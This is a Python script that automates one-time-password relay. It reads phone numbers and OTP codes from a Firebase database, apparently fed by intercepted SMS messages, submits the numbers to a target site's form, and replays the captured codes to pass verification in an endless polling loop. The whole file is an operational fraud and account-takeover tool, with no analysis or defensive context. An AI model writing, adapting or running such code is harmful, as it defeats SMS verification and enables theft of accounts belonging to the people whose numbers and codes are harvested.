import requests
import time
import json
from bs4 import BeautifulSoup

# === CONFIG ===
FIREBASE_DB = "https://39c-default-rtdb.firebaseio.com/users.json"
TARGET_URL = "https://cyberking-1.online/index.php"
SESSION = requests.Session()

def get_numbers_from_firebase():
    try:
        resp = requests.get(FIREBASE_DB)
        data = resp.json()
        numbers = []
        if isinstance(data, dict):
            for k, v in data.items():
                if 'phone' in v:
                    numbers.append((k, v['phone']))  # (node_id, phone)
        return numbers
    except Exception as e:
        print(f"[-] Firebase fetch failed: {e}")
        return []

def submit_phone_to_site(phone):
    try:
        resp = SESSION.get(TARGET_URL)
        soup = BeautifulSoup(resp.text, 'html.parser')
        
        # Find form inputs (adjust names if needed)
        form_action = soup.find("form").get("action", "")
        payload = {
            "phone": phone,
            "submit": "1"
        }
        
        post_url = TARGET_URL.rsplit('/', 1)[0] + "/" + form_action if form_action else TARGET_URL
        
        r = SESSION.post(post_url, data=payload)
        if "OTP" in r.text or "sent" in r.text.lower():
            print(f"[+] OTP sent to {phone}")
            return True
        else:
            print(f"[-] Failed to send OTP to {phone}")
            return False
    except Exception as e:
        print(f"[-] Error submitting phone: {e}")
        return False

def get_otp_from_firebase(phone):
    try:
        resp = requests.get(FIREBASE_DB)
        data = resp.json()
        for user in data.values():
            if user.get('phone') == phone and user.get('otp'):
                return user['otp']
        return None
    except:
        return None

def submit_otp(otp):
    try:
        payload = {
            "otp": otp,
            "verify": "1"
        }
        r = SESSION.post(TARGET_URL, data=payload)
        if "verified" in r.text.lower() or "success" in r.text:
            print(f"[+] Verified with OTP: {otp}")
            return True
        else:
            print(f"[-] OTP submit failed")
            return False
    except Exception as e:
        print(f"[-] OTP submission error: {e}")
        return False

# === MAIN LOOP ===
while True:
    numbers = get_numbers_from_firebase()
    for node_id, phone in numbers:
        print(f"[*] Processing {phone}")
        if submit_phone_to_site(phone):
            otp = None
            for _ in range(60):  # Wait up to 60 seconds for OTP
                otp = get_otp_from_firebase(phone)
                if otp:
                    print(f"[+] OTP found: {otp}")
                    submit_otp(otp)
                    break
                time.sleep(1)
    time.sleep(10)  # Poll every 10 seconds
